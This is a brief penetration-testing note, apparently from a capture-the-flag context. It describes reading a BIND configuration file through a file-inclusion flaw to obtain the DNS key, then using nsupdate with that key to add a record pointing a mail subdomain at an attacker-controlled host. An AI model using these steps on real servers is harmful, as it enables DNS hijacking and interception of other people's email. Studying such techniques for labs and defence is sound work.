# nsupdate quick note

by manesec.

## 0x1 Get the dns key using LFI like tech

The key file locate in `/etc/bind/named.conf`.

```
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the
// structure of BIND configuration files in Debian, *BEFORE* you customize
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "*******************************************";
};
```

## 0x2 Use this key to update the dns records.

```bash
──╼ $nsupdate
> server <REMOTE> 53
> key  hmac-sha256:rndc-key  *******************************************
> zone manesec.com
> update add email.manesec.com  86400 A  <Target>
> send
> quit
```

## 0x3 View the result

```bash
dig AXFR manesec.com @target

```

## If using to receive mail

Don’t forget to remove ‘3D’ and ‘=’ from our smptd response.